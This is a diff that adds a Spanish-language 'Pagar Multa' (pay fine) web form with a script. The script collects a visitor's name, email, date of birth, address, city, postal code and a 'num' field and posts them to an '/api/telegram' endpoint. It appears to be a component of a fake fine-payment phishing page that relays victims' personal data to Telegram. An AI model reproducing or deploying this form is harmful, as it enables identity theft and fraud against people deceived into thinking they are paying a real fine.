@@ -1,0 +1,33 @@
+<form id="myForm">
+    ...
+    <button type="submit" class="btn btn-primary">Pagar Multa</button>
+  </form>
+  
+  <script>
+  const form = document.getElementById("myForm");
+  
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+  
+    const data = {
+      first_name: form.first_name.value,
+      last_name: form.last_name.value,
+      email: form.email.value,
+      dob: form.dob.value,
+      address: form.address.value,
+      postal: form.postal.value,
+      city: form.city.value,
+      num: form.num.value,
+    };
+  
+    const res = await fetch("/api/telegram", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data),
+    });
+  
+    const result = await res.json();
+    alert(result.message);
+  });
+  </script>
+  
